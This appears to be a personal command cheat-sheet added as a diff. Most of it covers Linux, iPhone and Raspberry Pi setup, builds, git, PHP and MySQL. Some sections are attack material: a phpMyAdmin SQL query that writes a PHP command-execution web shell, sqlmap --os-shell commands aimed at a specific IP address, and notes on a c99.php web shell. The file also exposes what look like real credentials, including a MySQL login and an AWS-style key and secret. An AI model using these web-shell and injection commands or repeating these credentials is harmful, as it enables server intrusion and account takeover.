+export LDFLAGS=-L/usr/lib/
+export LD_LIBRARY_PATH=/usr/lib:/usr/local/lib
+
+#export ARCH=arm
+#export LDFLAGS=-Wl,-O1,--sort-common,--as-needed,-z,relro
+
+export CMAKE_C_COMPILER=/usr/bin/gcc
+export CMAKE_CXX_COMPILER=/usr/bin/g++
+
+#export LDFLAGS=-arch armv7 -L/usr/lib -L/usr/lib -L/usr/local/lib
+
+#export LD=/usr/bin/gcc
+
+
+export clang=/usr/bin/gcc
+
+export CFLAGS=-Qunused-arguments
+export CPPFLAGS=-Qunused-arguments
+#ARCHFLAGS=-arch armv7
+#-Wno-error=unused-command-line-argument-hard-error-in-future
+#export CFLAGS=-I/usr/include -L/usr/lib
+#export CPPFLAGS=$CFLAGS
+export CXXFLAGS=$CFLAGS
+________________________________ Enabling Touchpad mouse________________________________
+modprobe -r psmouse
+modprobe psmouse proto=imps
+
+xset m 5 5 ----> to set the speed of mouse
+__________________________ Trace Mobile Location Command ______________________________
+sudo curl -i -s -k -X 'POST' -H 'User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.0.1; Nexus 5 Build/LRX22C)' -H 'Content-Type: application/x-www-form-urlencoded' \
+'http://mobile.maps.yandex.net/cellid_location/?clid=1866854&lac=-1&cellid=-1&operatorid=null&countrycode=null&signalstrength=-1&wifinetworks=000000000000:-65&app=ymetro'
+
+_____________________________ WWW::Mechanize problem perl ___________________
+perl -MCPAN -e 'install WWW::Mechanize'
+
+______________________ Solution For numpy installation __________________
+ARCHFLAGS="-arch armv6 -Wno-error=unused-command-line-argument-hard-error-in-future" pip install numpy
+
+
+Error:
+-----------
+C compiler: gcc -fno-strict-aliasing -I/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS4.2.sdk/usr/include/ 
+-I/Users/linusyang/Documents/Code/python/python-for-ios/prelib/usr/include -arch armv6 -pipe -DNDEBUG -g 
+-O3 -Wall -Wstrict-prototypes
+
+compile options: '-Inumpy/core/src/private -Inumpy/core/src -Inumpy/core -Inumpy/core/src/npymath 
+-Inumpy/core/src/multiarray -Inumpy/core/src/umath -Inumpy/core/src/npysort -I/usr/include/python2.7 -c'
+gcc: _configtest.c
+cc1: error: unrecognized command line option "-arch"
+cc1: error: unrecognized command line option "-arch"
+failure.
+removing: _configtest.c _configtest.o
+
+
+Solutions:
+
+export CFLAGS=-Qunused-arguments
+export CPPFLAGS=-Qunused-arguments
+
+do numpy install now 
+python setup.py install
+#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$###############
+
+nvm install iPhone _______________________
+$ mkdir ~/.nvm
+$ git clone git://github.com/creationix/nvm.git ~/.nvm
+$ echo ". ~/.nvm/nvm.sh" >> ~/.bashrc
+$ source ~/.bashrc
+$ nvm install v0.6.6
+$ nvm alias default v0.6.6
+
+_________________________ Composer php install iPhone ___________
+$ curl -k https://getcomposer.org/installer | php
+$ sudo mv composer.phar /usr/local/bin/composer
+
+$ composer
+###################### VNC server for linux kali #######
+systemctl start vncserver-virtuald.service
+systemctl stop vncserver-virtuald.service
+
+gsettings set org.gnome.Vino require-encryption 'false'
+############### Scrolling Problem ssh ###############
+nano ~/.screenrc
+add:
+shell "/usr/bin/bash"
+termcapinfo xterm* ti@:te@
+
+
+################### unzip dmg, img ############
+7z x image.dmg
+7z x image .img
+
+############ Terminfo Error opening terminal: xterm-256color Solution For iPhone ####################
+
+mkdir ~/.terminfo
+cd ~/.terminfo
+ln -s /usr/share/terminfo/78
+ln -s 78 x
+
+it will create 78 and x as symlink to ~/.terminfo 
+that's it.
+copy terminfo file from any os x 
+
+############################### Building mutt on iPhone ########################
+CPPFLAGS="-I /var/include" CFLAGS="-g" ./configure --with-homespool=/var/spool
+make && make install
+
+
+################ Git Configuration #################
+First start by setting up your own public/private key pair set. This can use either DSA or RSA, so basically any key you setup will work. On most systems you can use ssh-keygen.
+
+    First you'll want to cd into your .ssh directory. Open up the terminal and run:
+
+        cd ~/.ssh && ssh-keygen
+
+    Next you need to copy this to your clipboard.
+        On OS X OR iPhone run: cat id_rsa.pub | pbcopy
+        On Linux run: cat id_rsa.pub | xclip
+        On Windows (via Cygwin/Git Bash) run: cat id_rsa.pub | clip
+    Add your key to your account via the website.
+    Finally setup your .gitconfig.
+        git config --global user.name "bob"
+        git config --global user.email bob@... (don't forget to restart your command line to make sure the config is reloaded)
+
+#################################################### Cpanm Install #############################
+
+cpna -i App::cpanminus
+
+######################################## xclip ##################
+
+xclip -sel c < test.txt
+
+echo $(xclip -o -clipboard) >> test.txt
+
+ #################### Enable mysqli ################
+/etc/php/7.0/apache2/php.ini
+extension=php_mysqli.dll
+sudo apt-get install php7.0-mysql
+
+################## mysql backup ####################################
+mysql database_name < database_name.sql
+
+mysqldump database_name > database_name.sql
+
+
+
+########################### Steam Problem After Installing deb file ###########################
+run : LD_PRELOAD='/usr/$LIB/libstdc++.so.6' LIBGL_DRI3_DISABLE=1 steam
+
+############### Give user to access a directory ################
+setfacl -m user:tom:rwx /home/samantha/folder
+
+################## apt fix ####################
+apt --fix-broken install
+##################### Remote mysql connection #################
+mysql -h160.153.129.231  -udb_ukshop_dbUser -p12358root
+
+########################## cyberduck ########################
+upload: duck --username ratul@ukshop4malaysia.com --upload ftps://ukshop4malaysia.com/ /var/www/html/busex/orderDetails.php
+
+copy: duck --copy ftps://dkocher@cyberduck.io/update.cyberduck.io/Cyberduck-4.6.1.zip rackspace://sandbox/Cyberduck-4.6.1.zip
+
+edit via ssh: duck --username dkocher --identity ~/.ssh/cyberduck.io-rsa --edit sftp://cyberduck.io/etc/httpd/vhosts.d/duck.sh.conf
+
+list: duck --username AKIAJOC4AH3QDQUB3C7Q --password ugQE+uj8tZyywd9hjoyZ5H5EaPcMuJ4Pk2C7jF85 --list s3:/// --region eu-central-1
+OR
+duck --list rackspace://sandbox/ --retry
+
+###################################### Shell Upload using phpmyadmin #####################
+
+inside query!
+
+SELECT “<?php system($_GET[‘cmd’]); ?>” into outfile “C:\\xampp\\htdocs\\backdoor.php”
+
+####################### Background Run Python Script #########################
+
+
+Use the shebang line in your python script. Make it executable using the command,
+
+>chmod +x test.py
+
+Use no hangup to run a program in background even if you close your terminal.
+
+>nohup /path/to/test.py &
+
+Do not forget to use & to put it in background.
+
+To see the process again, use in terminal,
+
+>ps ax | grep test.py
+
+################## ssl routines:ssl23_get_server_hello:tlsv1 alert protocol version iphone github github problem ###########################
+
+update curl then run git on 2.8.1 
+
+solved!
+
+##################### Profiling PHP #############################
+
+localhost/payroll/dashboard.php?DEBUG_PROFILE=true
+set this and open profiler to get results
+
+########## Powerful multi-tasking ##################
+byobu install from scratch 
+run byobu
+
+
+################### xdebug iphone #########################3
+sudo apt-get install php7.0-dev
+wget http://xdebug.org/files/xdebug-2.4.0rc2.tgz
+tar -xzf xdebug-2.4.0rc2.tgz
+cd xdebug-2.4.0RC2/
+phpize
+./configure --enable-xdebug
+make
+sudo cp modules/xdebug.so /usr/lib/.
+#FOR FPM
+sudo echo 'zend_extension="/usr/lib/xdebug.so"' > /etc/php/7.0/fpm/conf.d/20-xdebug.ini 
+sudo echo 'xdebug.remote_enable=1' >> /etc/php/7.0/fpm/conf.d/20-xdebug.ini 
+#FOR CLI
+sudo echo 'zend_extension="/usr/lib/xdebug.so"' > /etc/php/7.0/cli/conf.d/20-xdebug.ini 
+sudo echo 'xdebug.remote_enable=1' >> /etc/php/7.0/cli/conf.d/20-xdebug.ini
+#RESTART 
+sudo service php7.0-fpm restart
+
+#####################################   Install Xchat ###################3
+wget http://xchat.org/files/source/2.8/xchat-2.8.8.tar.xz --no-check-certificate
+dependencies:
+wget http://ftp.gnome.org/pub/gnome/sources/glib/2.56/glib-2.56.1.tar.xz --no-check-certificate
+
+tar zxf glib
+
+apt-get install libxcrypt-dev
+
+
+export LIBFFI_CFLAGS=-I/home/user/localroot/lib/libffi-3.0.11/include
+export LIBFFI_LIBS="-L/home/user/localroot/lib -lffi"
+
+export PCRE_LIBS="-L/usr/lib -lpcre"
+export PCRE_CFLAGS=-I/usr/include/pcre
+
+./configure --enable-libmount=no
+
+########################## Terminal Chat ####################
+
+On friend pc: nc -l -vv -p 11119
+On your pc : nc 119.148.39.107 11119
+
+then chat
+
+
+    -v : means Verbose
+    -vv : more verbose
+    -p : The local port Number
+
+
+
+################## Host Onion Site ##########################
+python3 -m http.server --bind 127.0.0.1 8080
+
+>install tor apt-get install tor
+
+install overlook-fing
+
+nano /etc/tor/torrc
+
+find ############### This section is just for location-hidden services ###
+
+edit lines like this:
+
+HiddenServiceDir /var/lib/tor/hidden_service/
+HiddenServicePort 80 127.0.0.1:8080
+
+
+open cd /usr/local/lib/fing
+
+fing -s 127.0.0.1 -o text,console
+
+
+edit index.html
+
+<html>
+<body>
+Null Byte
+</body>
+</html>
+
+now type tor [Note: From which directory you will run the command that will be the 
+Directory Listing Path.]
+
+got to cd /var/lib/tor/hidden_service
+cat hostname to get address 
+
+now use the address 
+
+and watch it on tor browser
+
+
+
+
+*********************
+If you want to run on default apache2 server
+then don't run "python3 -m http.server --bind 127.0.0.1 8080"
+
+just run "tor"
+and start apache2 server this will open default apache2 server on onion
+
+
+
+
+chmod 700 (or drwx------) for the folder (hostname in your case)
+chmod 600 (or -rw-------) for the private_key file.
+
+Both owned by the user and group that runs the tor process.
+
+********************
+
+
+**** Enable php and lighttppd ****
+apt-get install lighttpd php7.0-cgi
+
+lighty-enable-mod fastcgi 
+lighty-enable-mod fastcgi-php
+
+/etc/init.d/lighttpd restart
+
+
+nano /etc/lighttpd/lighttpd.conf
+
+Add/modify:
+
+server.port = 8765
+
+$HTTP["remoteip"] !~ "127.0.0.1" {
+      url.access-deny = ( "" )
+ }
+
+server.dir-listing          = "disable"
+
+screen tor
+
+######################## openssl build ##################
+32-bit
+For OpenSSL 1.1.0 and above, a 32-bit iOS cross-compiles uses the ios-cross target, and options similar to --prefix=/usr/local/openssl-ios. 
+
+
+./config -Wl,-rpath=/usr/local/ssl/lib
+$ export CC=clang;
+$ export CROSS_TOP=/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer
+$ export CROSS_SDK=iPhoneOS.sdk
+$ export PATH="/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin:$PATH"
+
+$ ./Configure ios-cross no-shared no-dso no-hw no-engine --prefix=/usr/local/openssl-ios
+
+Configuring OpenSSL version 1.1.1-dev (0x10101000L)
+    no-afalgeng     [forced]   OPENSSL_NO_AFALGENG
+    no-asan         [default]  OPENSSL_NO_ASAN
+    no-dso          [option]
+    no-dynamic-engine [forced]
+    ...
+    no-weak-ssl-ciphers [default]  OPENSSL_NO_WEAK_SSL_CIPHERS
+    no-zlib         [default]
+    no-zlib-dynamic [default]
+Configuring for ios-cross
+
+PERL          =perl
+PERLVERSION   =5.16.2 for darwin-thread-multi-2level
+HASHBANGPERL  =/usr/bin/env perl
+CC            =clang
+CFLAG         =-O3 -D_REENTRANT -arch armv7 -mios-version-min=6.0.0 -isysroot $(CROSS_TOP)/SDKs/$(CROSS_SDK) -fno-common
+CXX           =c++
+CXXFLAG       =-O3 -D_REENTRANT -arch armv7 -mios-version-min=6.0.0 -isysroot $(CROSS_TOP)/SDKs/$(CROSS_SDK) -fno-common
+DEFINES       =NDEBUG OPENSSL_THREADS OPENSSL_NO_DYNAMIC_ENGINE OPENSSL_PIC OPENSSL_BN_ASM_MONT OPENSSL_BN_ASM_GF2m SHA1_ASM SHA256_ASM SHA512_ASM AES_ASM BSAES_ASM GHASH_ASM ECP_NISTZ256_ASM POLY1305_ASM
+...
+
+If you are working with OpenSSL 1.0.2 or below, then use the iphoneos-cross target.
+
+$ export CC=clang;
+$ export CROSS_TOP=/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer
+$ export CROSS_SDK=iPhoneOS.sdk
+$ export PATH="/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin:$PATH"
+
+$ ./Configure iphoneos-cross no-shared no-dso no-hw no-engine --prefix=/usr/local/openssl-ios
+Configuring for iphoneos-cross
+    no-dso          [option]
+    no-engine       [option]   OPENSSL_NO_ENGINE (skip dir)
+    no-gmp          [default]  OPENSSL_NO_GMP (skip dir)
+    no-hw           [option]   OPENSSL_NO_HW
+    ...
+    no-weak-ssl-ciphers [default]  OPENSSL_NO_WEAK_SSL_CIPHERS (skip dir)
+    no-zlib         [default]
+    no-zlib-dynamic [default]
+IsMK1MF=0
+CC            =clang
+CFLAG         =-DOPENSSL_THREADS -D_REENTRANT -O3 -isysroot $(CROSS_TOP)/SDKs/$(CROSS_SDK) -fomit-frame-pointer -fno-common
+...
+#################### posix off / on #######################
+set +o posix. In general, -o turns an option on; +o turns it off, to the extent possible. (Turning posix mode off won't retroactively change the startup behaviour, for example.)
+
+
+########################## Git Commit #######################
+
+My Repo Branch >git@github.com:eshad/darkweb.git
+
+
+###################### SSL configuration ################
+export REQUESTS_CA_BUNDLE=/etc/ssl/certs/ca-certificates.crt
+
+create a new repository on the command line
+
+echo "# darkweb" >> README.md
+git init
+git add README.md
+git commit -m "first commit"
+git remote add origin git@github.com:eshad/darkweb.git
+git push -u origin master
+
+…or push an existing repository from the command line
+
+git remote add origin git@github.com:eshad/darkweb.git
+git push -u origin master
+
+
+
+remove existing origine 
+
+git remote rm origin
+# Remove remote
+git remote -v
+
+Or
+
+git remote add darkorigin ...............address
+
+then 
+
+git push -u ....
+
+
+::::::::Error::::::::
+Updates were rejected because the remote contains work that you do
+hint: not have locally. This is usually caused by another repository pushin
+
+git pull 
+#Fix any merge conflicts, if you have a `README.md` locally
+git push -u origin master
+
+
+######################### apache2 directory root ####################
+nano /etc/apache2/sites-enabled/000-default
+########################## ssmtp install to send mail #####################
+
+build from source to iphoneOs
+
+configure /usr/local/etc/ssmtp/ssmtp.conf
+
+root=username@gmail.com 
+mailhub=smtp.gmail.com:587 
+rewriteDomain= hostname=username@gmail.com 
+UseSTARTTLS=YES 
+AuthUser=username 
+AuthPass=password 
+FromLineOverride=YES
+
+############################ postfix setup #####################
+#setgid_group =
+
+################ list of all directory with size ###################
+ls -sh
+
+##################  android studio problem and solution #########
+$ cd ~/Android/Sdk/emulator/lib64/libstdc++
+$ mv libstdc++.so.6 libstdc++.so.6.bak
+$ ln -s /usr/lib/x86_64-linux-gnu/libstdc++.so.6 libstdc++.so.6
+
+
+################### TUN DEVICE ENABLE #####################
+How to Enable TUN/TAP on Linux VPS
+
+TUN/TAP is temporarily disabled by default on every SkySilk VPS, please create a new support ticket if you need TUN/TAP enabled on your VPS.
+
+
+Once enabled, please see below for information on activating TUN/TAP and enabling specific devices.
+
+
+Activating the TUN device
+
+When using a VPN, a special network device is used by the system to add a tunnel (TUN) to your virtual network stack. 
+
+
+We have enabled this device by default on all of our VPS offerings, however, you will need to activate it from within your virtual machine by running the following commands as root:
+
+cd /dev
+mkdir net
+mknod net/tun c 10 200
+chmod 0666 net/tun
+
+
+Script to Activate TUN at Startup
+
+The above commands will need to be run every time the virtual machine starts, so we can create a convenient script which runs those commands automatically on machine startup. 
+
+We will then add this script to the /etc/rc.local directory, which ensures that the script will run once the machine has booted for any reason. 
+
+
+Create the following script in /usr/sbin/tunscript.sh using your favorite text editor (like nano):
+
+#!/bin/bash
+mkdir /dev/net
+mknod /dev/net/tun c 10 200
+chmod 0666 /dev/net/tun
+
+
+Make sure that the script is executable:
+
+chmod +x /usr/sbin/tunscript.sh
+
+
+and add the script to /etc/rc.local so that it looks similar to this: (Note: If /etc/rc.local file does not exist, create the file in the /etc/ directory with the command "touch /etc/rc.local" )
+
+/usr/sbin/tunscript.sh || exit 1                                                          
+exit 0
+
+
+The or (||) exit 1 will report a failure if the script failed to run. The exit 0 denotes the end of rc.local, and reports that rc.local has run successfully. 
+
+
+Now the TUN device will be created every time the system boots. 
+
+
+############################################# File Permisssion Details ######################################################
+
+   ls -l acroread 
+   -rwxr-xr-x 1 10490 floppy 17242 May  8  2013 acroread
+
+
+What does this mean ?
+
+First - represents a regular file. It gives you a hint of the type of object it is. It can have following values.
+
+    d (directory)
+    c (character device)
+    l (symlink)
+    p (named pipe)
+    s (socket)
+    b (block device)
+    D (door)
+    - (regular file)
+
+
+r represents read permission.
+w represents write permission and
+x represents executable permission.
+
+First combination of rwx represents permission for the owner .
+Second combination of rwx represents permission for the group .
+Third combination of rwx represents permission for the other of the file.
+
+
+Octal notation
+
+Permission of file can also be represented in octal notation.
+In octal notation
+
+Read or r is represented by 4,
+Write or w is represented by 2
+Execute x is represented by 1.
+
+Sum of these three is use to represent the permission.
+
+stat command can be used to view file permission in octal notation
+
+  stat -c "%a %n" /path/of/file
+
+For example
+
+   stat -c "%a %n" acroread 
+   755 acroread
+
+Here you can see
+
+For owner it is 4+2+1=7 (111 in binary)
+For group it is 4+0+1=5 (101 in binary) and
+For other it is 4+0+1=5 (101 in binary).
+#################################   sqlinjection #########################
+Shell Uploading...
+
+sqlmap -u 119.148.39.107/TRZ/inventory/supplier_view_details.php?id=1 --random-agent --tor --os-shell
+sqlmap -u 119.148.39.107/TRZ/inventory/supplier_view_details.php?id=1 --os-cmd -v 1
+
+
+################################# Raspberry Pi Kali linux emergency moad problem solution ###############################
+fdisk -l
+
+sudo fsck /dev/mmcblk1p1 -y
+sudo fsck /dev/mmcblk1p2 -y
+
+############################### C99.php #########################################
+
+root@kali /var/www/html  
+╰─➤  ls -l c99.php 
+-rwxr-xr-x 1 root root 162862 May 14 13:18 c99.php
+╭─root@kali /var/www/html  
+╰─➤  head -1 c99.php 
+<?php
+╭─root@kali /var/www/html  
+╰─➤  sed -i '1 s/^.*$/<?php/g'
+
+################################### wireless-tool ############################### modification #############
+
+
+
+Wireless Tools is the reference implementation of tools supporting the ability to manipulate the Wireless Extensions API supported by most wireless LAN networking drivers.
+8.7.1. Installation of Wireless Tools
+
+Wireless Tools' Makefile contains explicitly which gcc, ar, and ranlib to use. Make sure the ${CLFS}/cross-tools versions of these programs are used instead of the host's:
+
+sed -i s/gcc/\$\{CLFS\_TARGET\}\-gcc/g Makefile
+sed -i s/\ ar/\ \$\{CLFS\_TARGET\}\-ar/g Makefile
+sed -i s/ranlib/\$\{CLFS\_TARGET\}\-ranlib/g Makefile
+
+Compile the package:
+[Note] Note
+
+There are options that can be passed to make and make install that will reduce the size and functionality of the Wireless Tools. See the Wireless Tools INSTALL file for more information.
+
+make PREFIX=${CLFS}/targetfs/usr
+
+Install the package:
+
+make install PREFIX=${CLFS}/targetfs/usr
+
+###################################### Perl Build ########################
+tar zxf Digest-SHA1-2.13.tar.gz
+cd Digest-SHA1-2.13
+perl Makefile.PL
+make
+make test
+make install
+
+
+
+
+############################################## ssh keypair ######################################
+ssh-copy-id -i 192.168.0.107
+OR
+ssh-copy-id -i ~/.ssh/id_rsa.pub pi@192.168.0.107
+
+check known host: ssh-keygen -lvf ~/.ssh/known_hosts
+
+For iPhone install ssh-copy-id command: curl -L https://raw.githubusercontent.com/beautifulcode/ssh-copy-id-for-OSX/master/install.sh | sh 
+
+############################################# File Permisssion Details End ######################################################
+For Sub domain: ngrok http -subdomain myapp 80
+Normal : ngrok http 80
+with password: ngrok http -auth "user:password" 80
+websocket: ngrok http 8000
+
+############################### Codeignitor URL not Found controller page in linux solution ##############################
+
+The problem caused by : 
+1) mod_rewrite not enable 
+2) no script 'AllowOverride All' in apache2.conf
+
+>sudo a2enmod rewrite
+>vim /etc/apache2/apache.conf
+
+<Directory /var/www/html/>
+	AllowOverride All
+</Directory>
+
+#################################zsh install ##########################################
+sh -c "$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"
+
+######################################## mysql not start raspberry pi ###########################
+apt-get remove --purge mariadb-server mariadb-client 
+apt-get purge mariadb-server-10.1
+apt-get purge mariadb-server-core-10.1
+apt-get autoremove
+apt-get autoclean
+apt-get install mariadb-server mariadb-client
+
+################################### R on iPhone ###########################
+3. Add a new repository to Cydia
+In Cydia, go to Manage->Sources and Add the following repository:
+
+    http://leafmoon.users.sourceforge.net/cydia/
+
+4. Install R the Statistical Language
+Use Search to find it, if you cannot, make sure your user level is either Hacker or Developer level under Manage->Settings because R is a command-line program so it will not show up if you are at the User level. You can change your level back to User immediately afterwards.
+
+5. Run R from command line
+Load up MobileTerminal and run R by simply typing:
+
+    R
+############################################# Gray screen raspberry pi vnc ####
+install tightvnc raspberry pi
+install vnc on android device
+install lxde on rpi
+
+nano ~/.vnc/xstartup
+add new line there
+/usr/bin/startlxde 
+
+and save
+vncserver -kill :1
+vncserver :1
+
+
+######################### Vim YouCompleteMe AUto complete #######################
+configure vim from source with the following command
+./configure --enable-pythoninterp=yes --with-python-command=/usr/bin/python
+
+################ Mount Driver ##################
+sudo mount //192.168.0.100/Finger_Timer /var/www/html/payroll/Finger_Timer -o username=gourango,password='land'
+####################################### make default php or others #################
+update-alternatives --set php /usr/bin/php7.2*
+##################### Bluetooth Service on/off ###########################
+service bluetooth restart
+###################################################### Android sshd with PC #################################33
+whoami 
+ifconfig
+
+logcat -s 'syslog'
+
+ssh a0_296@192.168.0.101 -p 8022
+
+########################################## change php version phpinfo () ################################
+It should be:
+
+a2dismod php7.0
+a2enmod php7.2
+
+or
+
+apt purge libapache2-mod-php7.0
+apt install libapache2-mod-php7.2
+
+############################# increase sound volume ##########################
+pactl -- set-sink-volume 0 +10%
+
+pactl -- set-sink-volume 0 -10%
+
+############################## Perl Base Modules ####################
+
+http://deb2.rubbish.de/cydia/pool/contrib/p/
+
+########################### Change PHP version From CLI / Terminal #########################
+update-alternatives --config php
+
+#################################  configure: error: cannot find install-sh, install.sh, or shtool in "." "./.." "./../.." ########################
+
+
+libtoolize --force
+aclocal
+autoheader
+automake --force-missing --add-missing
+autoconf
+./configure
+
+#####################################  dpkg scan packages ########################
+dpkg-scanpackages -m ./debs > Packages
+
+
+#################################### To setup mono setupTermux.sh use the following commands ###############################
+
+
+bash setupTermuxArch.sh
+bash setupTermuxArch.sh manual
+bash setupTermuxArch.sh wget # To avoid curl or downloading error 
+
+
+######################
+### go build
+
+go env
+
+$GOPATH=.../go/src
+$GOROOT=.../go
+$GOBIN=.../go/bin
+
+
+###### build project
+
+go install 
+go build main.go
+go run main.go
+
+########################## bundler install problem solution root -> user ############
+ sudo chown -R user: ~/.bundle
+chmod 1777 -R /data/data/com.termux/files/usr/tmp
+
+##############################################################
+
+
+################################# msmtp mail server ################################
+
+telnet localhost 25
+HELO localhost
+
+
+################################# sqlite commands ##################################
+***** Save sql to sqlite db *********
+
+1> sqlite3 testDB.db < testDB.sql
+
+
+**** convert sqlite db to sql **********
+
+2> sqlite3 testDB.db .dump > testDB.sql
+
+
+############################# commandline techniques #############################
+
+transform file: tr ' ' '\n' < file.txt | grep -o -c -i word
+
+[Note: -o output, -c count]
+####
+wc file.txt 
+count word, line
+###
+
+
+sed -i 's/old-text/new-text/g' input.txt
+
+sed 's/word1/word2/g' input.file
+
+
+
+
